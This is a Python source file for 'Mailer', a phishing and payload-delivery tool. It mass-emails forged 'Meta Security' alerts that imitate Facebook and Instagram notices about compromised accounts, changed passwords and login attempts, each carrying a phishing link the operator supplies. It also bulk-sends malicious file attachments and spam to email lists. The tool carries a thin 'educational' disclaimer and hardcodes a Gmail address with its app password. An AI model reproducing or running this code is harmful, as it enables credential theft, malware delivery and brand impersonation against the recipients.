#import pyfiglet
try:
    import random
    import os
    import datetime
    import smtplib
    import ssl
    import time as t
    import colorama
    from colorama import *
    colorama.init(autoreset=False)
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    
    from email.mime.base import MIMEBase
    from email import encoders
except:
    os.system("""
    apt install pip2
    pip install smtplib
    pip install datetime
    pip  install colorama
    """)
time = datetime.datetime.now()
os.system("clear")
print(Fore.YELLOW + "[" + Fore.RED + "!" +Fore.YELLOW + "]" + Fore.RED + " Disclaimer:Use this script for educational purposes only\n " +Fore.CYAN + "Spider Anongreyhat " + Fore.RED + "won\'t be responsible for any shit")
t.sleep(3)
colorama.init(autoreset=False)
SSL = 465 #SSL PORT
#Function for looping
def passw():
    user = input(f"{Fore.YELLOW} Enter your name: {Fore.GREEN}")
    rand = random.randrange(2034, 986575)
    sender = "f98108847@gmail.com"
    phonenumber = "snmd hsps sasc edxu"
    email = "spideranongreyhat@gmail.com"
    subject = "Mailer password requested!"
    message = MIMEMultipart("alternative")
    message["From"] = "Mailer"
    message["To"] = email
    message["Subject"] = subject
    html = f"{user} requested for password<br><br>This is the following info<br><br>User: <b>{user}</b><br>Password: <b>{rand}"
    part = MIMEText(html, "html")
    message.attach(part)
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", SSL, context=context) as server:
       # print(Fore.GREEN + "Signing into the server")
        t.sleep(3)
        try:
            server.login(sender, phonenumber)
            pass
        except:
            print(Fore.RED + "[!] Something went wrong")
            t.sleep(3)
            os.system("xdg-open https://wa.me/2349052863644")
            exit()
     #   print(Fore.GREEN + "Sending mail to", email)
#        t.sleep(3)
        try:
           server.sendmail(sender, email, message.as_string()
               )
           pass
        except:
           print(Fore.RED + "Something went wrong")
           t.sleep(3)
           exit()
    def passw1():
        password = int(input(f"{Fore.LIGHTYELLOW_EX}Enter password given to you: {Fore.GREEN}"))
        if password != rand:
            print(f"{Fore.RED} Incorrect password!\n\nMake sure you enter the correct password")
            t.sleep(3)
            passw1()
        else:
            print(f"{Fore.LIGHTMAGENTA_EX} Mailer unlocked√")
            t.sleep(2)
            file = open('752437.txt', 'w')
            file.write(f"{user}")
            file.close()
    passw1()
if os.path.exists("752437.txt"):
    pass
else:
    passw()
os.system("clear")
print(f"{Fore.CYAN}Visit {Fore.GREEN}https://support.google.com/mail/thread/205453566/how-to-generate-an-app-password?hl=en{Fore.CYAN} to generate app password before entering app password below")
email_address = input(f"{Fore.GREEN}Enter your email address: ")
password = input(f"Enter your app password: ")
def loop():
    os.system("clear")
    print("\033[1;33;40m")
    head = """
    
.___  ___.      ___       __   __       _______ .______      
|   \/   |     /   \     |  | |  |     |   ____||   _  \     
|  \  /  |    /  ^  \    |  | |  |     |  |__   |  |_)  |    
|  |\/|  |   /  /_\  \   |  | |  |     |   __|  |      /     
|  |  |  |  /  _____  \  |  | |  `----.|  |____ |  |\  \----.
|__|  |__| /__/     \__\ |__| |_______||_______|| _| `._____|
                                                             

    """
    #head = pyfiglet.figlet_format("M a i l e r")
    print(Fore.YELLOW + head + Style.RESET_ALL)
    print(Fore.RED +"version 2.2".center(60) + Style.RESET_ALL)
    print(Fore.YELLOW + "[+] " + Fore.GREEN + "Tool Name:Mailer\n" + Fore.YELLOW + "[+] " + Fore.GREEN + "Author:Spider Anongreyhat(Anonspidey)\n" + Fore.YELLOW + "[+] " + Fore.GREEN + "Version:2.2\n" + Fore.YELLOW + "[+] " + Fore.GREEN + "Team:TermuxHackz Society\n" + Fore.YELLOW + "[+] " + Fore.GREEN + "Github:https://github.com/spider863644\n" + Fore.YELLOW + "[+] " + Fore.GREEN + "WhatsApp:+2349052863644")
    print(Fore.RED + ">>>>>>>>>>>>>>>>>>>>>>>>>>>>" + Fore.CYAN + "Choose a valid option" + Fore.RED + "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<")
    print(Fore.MAGENTA + "[√]Turn on your mobile data connection")
    t.sleep(1)
    # The main menu
    print(Fore.BLUE + """
[1]Social Media Attack
[2]Send Malicious file
[3]Mass Mailer
[4]Banks attack
[5]Update program
[6]Exit Program
[7]About
[8]Credit
[9]Report bugs
[10]Join our whatsapp group chat
    """)
    options = (input(Fore.YELLOW + Back.RED + "Enter a number " + Style.RESET_ALL))
    os.system("clear")
    # Four indent
    if options == "1":
        #For Social media
        print(Fore.BLUE + """
[1]Facebook
[2]Instagram
[3]Twitter(Coming Soon)
[4]TikTok(Coming Soon)
        """)
        social = (input(Fore.YELLOW + Back.RED + "Choose a social media " + Style.RESET_ALL))
        os.system("clear")
        #Eight indent
        if social == "1":
            #For Facebook
            print(Fore.BLUE + """
[1]Compromised Facebook Account
[2]Changed Password
[3]Tried To login
[4]Custom(Not available)
""")
            facebook = (input(Fore.YELLOW + Back.RED + "Choose an option " + Style.RESET_ALL))
            #Compromised Facebook account
            #12 indentation
            if facebook == "1":
                link = input(Fore.GREEN + "Enter your phishing link: " + Style.RESET_ALL)
                name = ""
                #Email for compromised facebook
                sender = email_address
                phonenumber = password
                email = input(Fore.GREEN + "Enter email list: " + Style.RESET_ALL)
                if os.path.exists(email):
                	pass
                else:
                	print(Fore.RED + "INVALID FILE PATH")
                	t.sleep(2)
                	loop()
                email_list = open(email, 'r')
                for mails in email_list:
                    message = MIMEMultipart("alternative")
                    message["Subject"] = "Compromised Facebook Account"
                    message["From"] = "Meta Security"
                    message["To"] = mails
                    html = """
                    <html>
                    <head>  
                    <title>Facebook: Facebook account got compromised</title>
                    <meta name="viewport"
                    content="width=device-width
                    initial-scale=1.0">
                    </head>
                    <body>
                    <style>
                    body {
                    background-color:white;
                    color:black;
                    
                    }
                    </style> 
                    <h4> Hi, """ + name + """ </h4>
                    <p> A new device logged into your facebook account on """ + time.strftime("%A, %B %d, %Y at %I:%M% %z") + """ </p>
                    <pre>
                    Operating      Windows
                    System:   
                    Browser:        Chrome
                    IP address:    192.268.40.221
                    Estimated       Ormoc City, Eastern
                    location:        VISAYAS, PH
                    </pre>
                    If this is you kindly disregard this email. <p> If this was not you <a href=""" + link + """ + > please reset your password </a> to secure your account. </p> </h4
                    <br>  </br>
                    <br>  </br>
                    <br>  </br>
                    <br>  </br>
                    <h6> <p> <center> From </center> <center> Meta <center> © Facebook. Meta Platforms, Inc, 1601 Willow </center> <center> Road, Menlo Park, CA 94025, US </center>  </h6>
                    <p> <h6> <center> This message was sent to </center> <center> <a href="">""" + mails + """</a>  and intended for </center> <center> """ + name + """. Not your account? <a href="">  </a> <a href=""> Remove your email address </a> from this account </center> </h6> </p>
                    </body> 
                    </html>
                    """
                    part =MIMEText(html, "html")  
                    message.attach(part)
                    context = ssl.create_default_context()
                    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                        print(Fore.GREEN + "Loging into the server..")
                        try:
                            server.login(sender, phonenumber)
                            print(Fore.GREEN + "Logged In Succesfully")
                        except:
                            print(Fore.RED + "Login failed!\nCheck your data connection and try again")
                            t.sleep(3)
                            loop()
                        print(Fore.GREEN + "Sending mail to " + mails)
                        try:
                            server.sendmail(
                            sender, mails, message.as_string()
                        )
                            print(Fore.GREEN + "Mail sent sucessfully")
                        except:
                            print(Fore.RED + "Failed!\nCouldn\'t send mail due to some error")
                            
                            
            #Changed password             
            elif facebook == "2":
                link = input(Fore.GREEN + "Enter phishing link: " + Style.RESET_ALL)
                name = ""
                sender = email_address
                phonenumber = password
                email = input(Fore.GREEN + "Enter email list: " + Style.RESET_ALL)
                if os.path.exists(email):
                	pass
                else:
                	print(Fore.RED + "INVALID FILE PATH")
                	t.sleep(2)
                	loop()
                email_list = open(email, 'r')
                for mails in email_list:
                    message = MIMEMultipart("alternative")
                    message["Subject"] = "Facebook Changed Password"
                    message["From"] = "Meta Security"
                    message["To"] = mails
                    html = """
                    <html>
                <head>  
                <title>Facebook: Password Changed</title>
                <meta name="viewport"
                content="width=device-width
                initial-scale=1.0">
                </head>
                <body>
                <style>
                body {
                background-color:white;
                color:black;
                
                }
                </style> 
                <h4> Hi, """ + name + """ </h4>
                <p> Your facebook password was changed recently on """ + time.strftime("%A, %B %d, %Y at %I:%M%") + """ </p>
                <pre>
                Operating      Windows
                System:   
                Browser:        Chrome
                IP address:    192.268.49.221
                Estimated       Ormoc City, Eastern
                location:        VISAYAS, PH
                </pre>
                If this is you kindly disregard this email. <p> If this was not you <a href=""" + link + """  > please reset your password </a> to secure your account. </p> </h4
                <br>  </br>
                <br>  </br>
                <br>  </br>
                <br>  </br>
                <h6> <p> <center> From </center> <center> Meta <center> © Facebook. Meta Platforms, Inc, 1601 Willow </center> <center> Road, Menlo Park, CA 94025, US </center>  </h6>
                <p> <h6> <center> This message was sent to </center> <center> <a href="">""" + mails + """</a>  and intended for </center> <center> """ + name + """. Not your account? <a href="">  </a> <a href=""> Remove your email address </a> from this account </center> </h6> </p>
                </body> 
                </html>
                """
                    part = MIMEText(html, "html")
                    message.attach(part)
                    context = ssl.create_default_context()
                    with smtplib.SMTP_SSL("smtp.gmail.com", SSL, context=context)as server:
                        print(Fore.GREEN + "[!] Signing in into the server")
                        try:
                            server.login(sender, phonenumber)
                            print(Fore.GREEN + "[✓] Logged in sucessfully")
                        except:
                            print(Fore.RED + "[!] Failed to log in!")
                            loop()
                        print(Fore.GREEN + "Sending mail to ", mails)
                        try:
                            server.sendmail(
                            sender, mails, message.as_string()
                            )
                            print(Fore.GREEN + "[√]Mail sent successfully")
                        except:
                            print(Fore.RED + "Message sent failed!")
                        #t.sleep(1.5)
                
            #tried to login
            elif facebook== "3":
                link = input(Fore.GREEN + "Enter phishing link: " + Style.RESET_ALL)
                name = ""
                sender = email_address
                phonenumber = password
                email = input(Fore.GREEN + "Enter email list: " + Style.RESET_ALL)
                if os.path.exists(email):
                	pass
                else:
                	print(Fore.RED + "INVALID FILE PATH")
                	t.sleep(2)
                	loop()
                email_list = open(email, 'r')
                for mails in email_list:
                    message = MIMEMultipart("alternative")
                    message["Subject"] = "Facebook: Someone tried to login into your account"
                    message["From"] = "Meta Security"
                    message["To"] = mails
                    html = """
                    
                    <html>
                <head>  
                <title>Facebook: Password Changed</title>
                <meta name="viewport"
                content="width=device-width
                initial-scale=1.0">
                </head>
                <body>
                <style>
                body {
                background-color:white;
                color:black;
                
                }
                </style> 
                <h4> Hi, """ + name + """ </h4>
                <p> Someone just used your password to try to sign in to your account. Facebook blocked them, but you should check what happened. """ + time.strftime("%A, %B %d, %Y at %I:%M%") + """ </p>
                <pre>
                Operating      Windows
                System:   
                Browser:        Chrome
                IP address:    192.268.49.221
                Estimated       Ormoc City, Eastern
                location:        VISAYAS, PH
                </pre>
                If this is you kindly disregard this email. <p> If this was not you <a href="""  + link + """  > please reset your password </a> to secure your account. </p> </h4
                <br>  </br>
                <br>  </br>
                <br>  </br>
                <br>  </br>
                <h6> <p> <center> From </center> <center> Meta <center> © Facebook. Meta Platforms, Inc, 1601 Willow </center> <center> Road, Menlo Park, CA 94025, US </center>  </h6>
                <p> <h6> <center> This message was sent to </center> <center> <a href="">""" + mails + """</a>  and intended for </center> <center> """ + name + """. Not your account? <a href="">  </a> <a href=""> Remove your email address </a> from this account </center> </h6> </p>
                </body> 
                </html>
                """
                    part = MIMEText(html, "html")
                    message.attach(part)
                    context = ssl.create_default_context()
                    with smtplib.SMTP_SSL("smtp.gmail.com", SSL, context=context) as server:
                        print(Fore.GREEN + "Logging into the server")
                    
                        try:
                            server.login(sender, phonenumber)
                            print(Fore.GREEN + "[✓] Login succesfully")
                        except:
                            print(Fore.RED + "[!] Login failed\nPlease try again later")
                            
                            loop()
                        print(Fore.GREEN + "Sending mail to" + mails)
                        
                        try:
                            server.sendmail(
                            sender, mails, message.as_string()
                            )
                            print(Fore.GREEN + "[✓] Mail sent sucessfully")
                        except:
                            print(Fore.RED + "[!] Failed to send email")
                            
                            
            elif facebook == "4":
                print(Fore.RED + "Not available yet")
                t.sleep(4)
                loop()
                #This is the end for facebook 
                #Done with facebook
            else:
                print(Fore.RED + "Invalid option")
                t.sleep(3)
                loop()
        elif social == "3":
            print(f"{Fore.RED}NOT AVAILABLE")
            t.sleep(2)
            loop()
        elif social == "4":
            print(f"{Fore.RED}NOT AVAILABLE")
            t.sleep(2)
            loop()
        elif social == "2":
            #For instagram
            print(Fore.BLUE + """
[1]Compromised Instagram account
[2]Password Changed
[3]Tried to login
[4]Custom(Not available)
            """)
            instagram = input(Fore.YELLOW +Back.RED + "Choose a valid option: " + Style.RESET_ALL)
            #12 indent
            #Compromised Instagram account
            if instagram == "1":
                link = input(Fore.GREEN + "Enter instagram phishing link: " + Style.RESET_ALL)
                email = input(Fore.GREEN + "Enter email list: " + Style.RESET_ALL)
                if os.path.exists(email):
                	pass
                else:
                	print(Fore.RED + "INVALID FILE PATH")
                	t.sleep(2)
                	loop()
                email_list = open(email, 'r')
                for mails in email_list:
	                name = " "
	                sender = email_address
	                phonenumber = password
	                message = MIMEMultipart("alternative")
	                message["Subject"] = "Compromised instagram account"
	                message["From"] = "Meta Security"
	                message["To"] = mails
	                html = """
	                <!DOCTYPE html>
	<html lang="eng">
	<title>Instagram | Changed password</title>
	<head>
	<meta charset="UTF-8">
	<meta name="view"
	>
	</head>
	<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR1WkXRYI5ZaZMErQrID6ZB8TLBolAPxgjNaO60jllmlIQ_6hCWZ6g6JJo&s=10" alt="photo not available" width="100%" height="80px" style="border-radius:5px;">
	<h3>Hi """ + name + """</h3>
	<p>We detected a new device signed in into your account on   """  + time.strftime("%H:%M on %A, %B %Y.") + """<br>
	<br>
	If this was not you, <a href="""  + link +  """>please secure your account</a></p>
	<br> <br>
	<br> <br>
	<br> <br>
	<br>  <br>
	<h6><center>From<br>
	Meta<br>
	©Facebook. Meta platform, ics, 1601 Willow<br>
	Road, Menlo Park, CA 94025, US
	<br> <br>
	<br> <br>
	This message was sent to<br>
	""" + mails + """ and intended for <br>""" + name + """. Not your account? <a href="">remove your email address from this account
	</html>
	                """
	                part = MIMEText(html, "html")
	                message.attach(part)
	                context = ssl.create_default_context()
	                with smtplib.SMTP_SSL("smtp.gmail.com", SSL, context=context) as server:
	                    print(Fore.GREEN + "Logging into the server")
	                    #t.sleep(2)
	                    try:
	                        server.login(sender, phonenumber)
	                        print(Fore.GREEN + "[✓] Login sucessfully")
	                    except:
	                        print(Fore.RED + "[!] Login failed\nTry again later")
	                        #t.sleep(3)
	                        loop()
	                    print(Fore.GREEN + "Sending mail to", mails)
	                    t.sleep(2)
	                    try:
	                        server.sendmail(
	                        sender, mails, message.as_string()
	                        )
	                        print(Fore.GREEN + "[✓] Mail sent sucessfully")
	                    except:
	                        print(Fore.RED + "[!] Failed to send email\nTry again later")
	                        pass
            #For Changed password(Instagram)
            elif instagram == "2":
                sender = email_address
                phonenumber = password
                link = input(Fore.GREEN + "Enter the phishing link: " + Style.RESET_ALL)
                email = input(Fore.GREEN + "Enter email list: " + Style.RESET_ALL)
                if os.path.exists(email):
                	pass
                else:
                	print(Fore.RED + "INVALID FILE PATH")
                	t.sleep(2)
                	loop()
                email_list = open(email, 'r')
                for mails in email_list:
	                name = " "
	                message = MIMEMultipart("alternative")
	                message["Subject"] = "Password Changed"
	                message["From"] = "Meta Security"
	                message["To"] = mails
	                html = """
	                <!DOCTYPE html>
	<html lang="eng">
	<title>Instagram| Changed password</title>
	<head>
	<meta charset="UTF-8">
	<meta name="view"
	>
	</head>
	<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR1WkXRYI5ZaZMErQrID6ZB8TLBolAPxgjNaO60jllmlIQ_6hCWZ6g6JJo&s=10" alt="photo not available" width="100%" height="80px" style="border-radius:5px;">
	<h3>Hi """ + name + """</h3>
	<p>Your password was recently changed at """ + time.strftime("%H:%M %Z on %A, %B %Y.") + """<br>
	<br>
	If this was not you, <a href="""  + link +  """>please secure your account</a></p>
	<br> <br>
	<br> <br>
	<br> <br>
	<br>  <br>
	<h6><center>From<br>
	Meta<br>
	©Facebook. Meta platform, ics, 1601 Willow<br>
	Road, Menlo Park, CA 94025, US
	<br> <br>
	<br> <br>
	This message was sent to<br>
	""" + mails + """ and intended for <br>""" + name + """. Not your account? <a href="">remove your email address from this account
	</head>
	</html>
	                """
	                part = MIMEText(html, "html")
	                message.attach(part)
	                context = ssl.create_default_context()
	                with smtplib.SMTP_SSL("smtp.gmail.com", SSL, context=context) as server:
	                    print(Fore.GREEN + 'Logining into the server')
	                    try:
	                        server.login(sender, phonenumber)
	                        print(Fore.GREEN + "[✓] Logged in succesfully")
	                    except:
	                        print(Fore.RED + "[!] Failed to login\nTry again later")
	                        #t.sleep(3)
	                        
	                    print(Fore.GREEN + "Sending mail to", mails)
	                    #t.sleep(2)
	                    try:
	                        server.sendmail(
	                        sender, mails, message.as_string()
	                        )
	                        print(Fore.GREEN + "[✓] Mail sent successfully")
	                    except:
	                        print(Fore.RED + "[!] Failed to send mail\nTry again later")
	                      #  t.sleep(3)
            #Tried to login instagram
            elif instagram == "3":
                sender = email_address
                phonenumber = password
                link = input(Fore.GREEN + "Enter phishing link: " + Style.RESET_ALL)
                email = input(Fore.GREEN + "Enter email list: " + Style.RESET_ALL)
                if os.path.exists(email):
                	pass
                else:
                	print(Fore.RED + "INVALID FILE PATH")
                	t.sleep(2)
                	loop()
                email_list = open(email, 'r')
                for mails in email_list:
                    message = MIMEMultipart("alternative")
                    message["Subject"] = "Instagram: Someone tried to login"
                    message["From"] = "Meta Security"
                    message["To"] = mails
                    name = ""
                    html = """
    <!DOCTYPE html>
    <html lang="eng">
    <title>Instagram| Changed password</title>
    <head>
    <meta charset="UTF-8">
    <meta name="view"
    >
    </head>
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR1WkXRYI5ZaZMErQrID6ZB8TLBolAPxgjNaO60jllmlIQ_6hCWZ6g6JJo&s=10" alt="photo not available" width="100%" height="80px" style="border-radius:5px;">
    <h3>Hi  """+ name + """  </h3>
    <p>Someone tried to login to your account with your password on  """ + time.strftime("%H:%M %Z on %A, %B %Y.") + """<br>
    <br>
    If this was not you, <a href="""  + link +  """>please secure your account</a></p>
    <br> <br>
    <br> <br>
    <br> <br>
    <br>  <br>
    <h6><center>From<br>
    Meta<br>
    ©Facebook. Meta platform, ics, 1601 Willow<br>
    Road, Menlo Park, CA 94025, US
    <br> <br>
    <br> <br>
    This message was sent to<br>
    """ + mails + """ and intended for <br>""" +  name + """. Not your account? <a href="">remove your email address from this account
                    """
                    part = MIMEText(html, "html")
                    message.attach(part)
                    context = ssl.create_default_context()
                    with smtplib.SMTP_SSL("smtp.gmail.com", SSL, context=context) as server:
                        print(Fore.GREEN + "logining into ther server")
                        try:
                            server.login(sender, phonenumber)
                            print(Fore.GREEN + "[✓] Logged in sucessfully")
                        except:
                            print(Fore.RED + '[!] Failed to login\n try again')
                            t.sleep(3)
                            loop()
                        print(Fore.GREEN + "Sending mail to", mails)
                        try:
                            server.sendmail(
                            sender, mails, message.as_string()
                            )
                            print(Fore.GREEN + "[✓] Mail sent succesfully")
                        except:
                            print(Fore.RED + "[!] Failed to send mail")
                            
                            
            #for  custom mail
            elif instagram == "4":
                        print(Fore.RED + "Not available!")
                        t.sleep(3)
                        loop()
            else:
                print(Fore.RED + "Invalid option") 
                t.sleep(3)
                loop()
        else:
            print(Fore.RED + "Invalid option")
            t.sleep(3)
            loop()
            #payload
    elif options == "2":
        print(Fore.BLUE + "Malicious file Sender")
        sender = email_address
        phonenumber = password
        print(Fore.RED + "________________________________________")
        filename = input(Fore.GREEN + 'Input file path and file name\nExample:anonspider/home/payload.pdf: ' + Style.RESET_ALL)
        body = input(Fore.GREEN + "Enter message[optional]<HTML FORMAT>: " + Style.RESET_ALL)
        sub = input(Fore.GREEN + "Enter Subject: " + Style.RESET_ALL)
        frm = input(Fore.GREEN + "Enter Sender name: " + Style.RESET_ALL)
        email = input(Fore.GREEN + "Enter email list: " + Style.RESET_ALL)
        if os.path.exists(email):
            pass
        else:
            print(Fore.RED + "INVALID FILE PATH")
            t.sleep(2)
            loop()
        print(Fore.BLUE + "Checking if file exist")
        t.sleep(1)
        try:
            open(filename, "rb")
            print(Fore.GREEN + "The file you are trying to send exist")
        except:
            print(Fore.RED + "The file you are trying to send does not exist!")
            t.sleep(3)
            loop()
        email_list = open(email, 'r')
        for mails in email_list:
            message = MIMEMultipart()
            message["From"] = frm
            message["Subject"] = sub
            message["To"] = mails
            message.attach(MIMEText(body, "html"))
            
            with open(filename, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
            part.add_header(
            "content-Disposition",
            f"attachment; filename= {filename}",
            )
            message.attach(part)
            text = message.as_string()
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL("smtp.gmail.com", SSL, context=context) as server:
                print(Fore.GREEN + "Logining into the server")
                try:
                    server.login(sender, phonenumber)
                    print(Fore.GREEN + "[✓]Login sucessfully")
                except:
                    print(Fore.RED + "[!]Failed to login")
                    t.sleep(4)
                    loop()
                print(Fore.GREEN + "Sending file to ", mails)
                try:
                    server.sendmail(sender, mails, text)
                    print(Fore.GREEN + "[✓]File sent sucessfully")
                except:
                    print(Fore.RED + "[!]Failed to send file")
                    t.sleep(1)
                    
    elif options == "3":
        #Mass mailer
        print(Fore.BLUE + "MASS MAILER\nSend a single mail to many recepient")
        sender = email_address
        phonenumber = password
        frm = input(Fore.GREEN + "Enter Sender name: " + Style.RESET_ALL)
        subject = input(Fore.GREEN + "Enter Subject of the mail: " + Style.RESET_ALL)
        email = input(Fore.GREEN + "Enter email list: " + Style.RESET_ALL)
        letter = input(Fore.GREEN + "Enter Letter: " + Style.RESET_ALL)
        if os.path.exists(letter):
            pass
        else:
            print(Fore.RED + "INVALID FILE PATH")
            t.sleep(2)
            loop()
            
        if os.path.exists(email):
            pass
        else:
            print(Fore.RED + "INVALID FILE PATH")
            t.sleep(2)
            loop()
        mess = open(letter, 'r')
        html = mess.read()
        email_list = open(email, 'r')
        for mails in email_list:
            message = MIMEMultipart("alternative")
            message["From"] = frm
            message["To"] = mails
            message["Subject"] = subject
            part = MIMEText(html, "html")
            message.attach(part)
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL("smtp.gmail.com", SSL, context=context) as server:
                print(Fore.GREEN + "Signing into the server")
                t.sleep(3)
                try:
                    server.login(sender, phonenumber)
                    print(Fore.GREEN + "[✓] Logged in sucessfully")
                except:
                    print(Fore.RED + "[!] Login failed")
                    t.sleep(3)
                    loop()
                print(Fore.GREEN + "Sending mail to", mails)
                try:
                    server.sendmail(sender, mails, message.as_string()
                    )
                    print(Fore.GREEN + "[✓] Mail sent sucessfully")
                except:
                    print(Fore.RED + "Failed to send Mail!")
                    t.sleep(1)
                    
    elif options == "6":
        print(Fore.GREEN + "Thanks for using mailer\nKindly follow me on github")
        t.sleep(3)
        exit()
    elif options == "5":
        print(Fore.YELLOW + Back.RED + "Updating mailer" + Style.RESET_ALL)
        t.sleep(3)
        os.system("""
        cd $HOME
        rm -rf Mailer
        git clone https://github.com/SpiderAnongreyhat/Mailer
        """)
        print(Fore.BLUE + """
        Now type the following commands
cd $HOME
cd Mailer
python3 mailer.py
""")
        exit()
    elif options == "7":
        print(Fore.GREEN + "ABOUT MAILER")
        print(Fore.BLUE + """
Mailer is a python script created by Spider Anongreyhat(Anonspidey)

FEATURES OF MAILER:
1. Social media attack (Spear-Phishing)
2. Payload Sender
3. Mass Mailer
4. Bank attack(Coming soon)

TESTED ON:
Linux(Parrot OS)
Termux
""")
    elif options == "8":
        print(Fore.YELLOW + Back.RED + "CREDIT GOES TO THE SUPPORTERS  MENTIONED BELOW" + Style.RESET_ALL + Fore.GREEN + """
Spider Anongreyhat
Anonwilli
AnonyminHack5
N00B H4X0R
TheN00B
""")
    elif options == "9":
        print(Fore.BLUE + "REPORTING OF BUGS\nREDIRECTING USER TO MY INBOX FOR BUG REPORT")
        print(Fore.GREEN + """
Kindly report any bugs or error you faced while using Mailer """ + Fore.RED + """
Note:Report with screenshot or screen record """
)
        t.sleep(6)
        os.system("xdg-open https://wa.me/2349052863644")
    elif options == "10":
        print(Fore.BLUE + "REDIRECTING TO OUR WHATSAPP GROUP CHAT")
        t.sleep(3)
        os.system("xdg-open https://chat.whatsapp.com/BivW6pA9Emu9bDM2rZkaQy")
    elif options == "4":
        print(f"{Fore.RED}Bank attack is coming soon ")
    else:
        print(Fore.RED + "Invalid option")
        t.sleep(3)
        loop()
    cont = input(Fore.YELLOW + Back.RED + "Do you wanna continue? [y/n]: " + Style.RESET_ALL).strip().upper()
    if cont == "Y":
        loop()
loop()
